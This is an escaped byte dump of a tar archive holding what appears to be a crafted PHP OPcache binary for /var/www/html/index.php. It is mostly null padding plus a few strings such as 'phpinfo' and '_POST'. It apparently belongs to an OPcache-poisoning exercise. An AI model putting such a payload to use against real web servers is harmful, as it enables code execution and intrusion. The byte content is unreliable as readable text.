x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x000000666\\x000000000\\x000000000\\x0000000001700\\x0014510444150\\x00017165\\x00 0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00ustar\\x0000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00OPCACHE\\x00214510e772fba140ea7a33a277f2799ep\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa9\\xf9 e\\x00\\x00\\x00\\x00\\x07]1\\xcd \\xd8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00badm\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00ibu.\\xb0\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\xfe\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\xfe\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80F\\&quot;e\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00p\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00#olh\\x99F\\&quot;e\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00V\\x00\\x00\\x00\\xb2$\\x83\\xaf\\xdd\\xaa\\xdf\\x8c\\x17\\x00\\x00\\x00\\x00\\x00\\x00\\x00/var/www/html/index.php\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\&quot;@\\xb0\\xc5\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00p\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00V\\x00\\x00\\x00\\xf9\\xe0\\xf8\\xab\\xb5\\xd0\\x00\\x80\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00phpinfo\\x00\\x02\\x00\\x00\\x00V\\x00\\x00\\x00jQ\\xe3\\x0e1\\x00\\x00\\x80\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00_POST\\x00\\x00\\x00E\\x05\\x00\\x00\\x00\\x00\\x00\\x00P\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00=\\x00\\x01\\x00\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x81\\x00\\x00\\x007\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\xff\\xff\\xff\\xff`\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00P\\x01\\x00\\x02A\\x06\\x00\\x00\\x00\\x00\\x00\\x00`\\x00\\x00\\x00\\x02\\x00\\x00\\x00P\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00Q\\x02\\x01\\x02\\xf1\\x05\\x00\\x00\\x00\\x00\\x00\\x00P\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00I\\x02\\x00\\x00F\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x03\\x00\\x00\\x00&gt;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00